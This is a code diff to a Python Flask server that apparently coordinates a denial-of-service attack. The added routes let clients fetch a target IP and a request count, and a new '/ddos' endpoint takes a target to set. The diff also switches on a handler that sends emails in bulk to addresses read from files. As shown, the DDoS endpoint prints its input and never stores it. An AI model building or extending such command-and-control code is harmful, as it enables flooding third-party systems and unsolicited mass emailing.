@@ -1,17 +1,18 @@
 import os
-from twilio.rest import TwilioRestClient
+# from twilio.rest import TwilioRestClient
 import socket
 import smtplib
 from email.mime.text import MIMEText
 import Crypto
 from Crypto.PublicKey import RSA
 from Crypto import Random
-from flask import Flask
-from flask import request
+from flask import Flask, jsonify, request
 app = Flask(__name__)
 
 sent_emails = []
 sent_numbers = []
+ddosip = ''
+ddoscount = 0
 
 def handlePost(clientNumber, clientEmails):
 	fp_numbers = open('phonenumbers.txt', 'r') # temp, would normally be sent from client
@@ -53,11 +54,20 @@ def handlePost(clientNumber, clientEmails):
 				s.sendmail(me, [you], msg.as_string())
 	s.quit()
 
-@app.route('/', methods=['POST'])
+@app.route('/', methods=['POST', 'GET'])
 def result():
-		# handlePost(request.form['numbers'], request.form['emails'])
-		print request.form['numbers']
-		return 'Received!'
+		if request.method == 'POST':
+			handlePost(request.form['numbers'], request.form['emails'])
+			return ''
+		else:
+			return jsonify(result={'ip': ddosip, 'count': ddoscount})
+
+@app.route('/ddos', methods=['POST'])
+def ddosresult():
+		ip = request.form['ip']
+		count = int(request.form['count'])
+		print (ip,count)
+		return ''
 
 if __name__ == "__main__":
     app.run()
